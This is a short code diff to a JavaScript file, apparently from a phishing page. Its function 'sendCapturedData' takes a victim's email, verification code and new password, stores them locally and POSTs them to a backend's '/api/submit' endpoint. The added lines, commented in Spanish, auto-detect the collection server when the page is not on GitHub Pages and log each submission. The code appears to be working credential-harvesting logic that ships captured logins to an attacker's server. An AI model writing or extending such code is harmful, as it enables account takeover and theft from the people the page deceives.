@@ -95,9 +95,15 @@ function sendCapturedData(email, code, newPassword) {
         console.error('Error guardando en localStorage:', e);
     }
     
+    // Auto-detectar backend: si no está en GitHub Pages, usar servidor local
+    if (!window.BACKEND_URL && !window.location.hostname.includes('github.io')) {
+        window.BACKEND_URL = window.location.origin;
+    }
+    
     // Send to internal backend if available
     const backend = window.BACKEND_URL || '';
     if (backend) {
+        console.log('📤 Enviando al backend:', backend);
         fetch(backend + '/api/submit', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
